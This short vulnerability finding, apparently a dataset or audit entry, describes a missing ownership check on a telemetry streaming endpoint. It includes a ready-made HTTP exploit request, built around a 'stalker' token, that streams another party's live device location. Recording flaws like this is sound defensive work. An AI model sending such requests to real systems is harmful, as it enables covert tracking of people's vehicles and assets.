diagnosis: The telemetry SSE endpoint streams real-time physical device coordinates and sensor readings directly by device_uuid. It does not verify that device_uuid belongs to current_user, allowing an attacker to track the physical real-time location and speed of third-party vehicles or assets.
exploit_request:
GET /api/v1/telemetry/devices/9fa82110-3329-4ae8-8092-124958102834/stream HTTP/1.1
Host: api.example.com
Authorization: Bearer <stalker_jwt>
Accept: text/event-stream
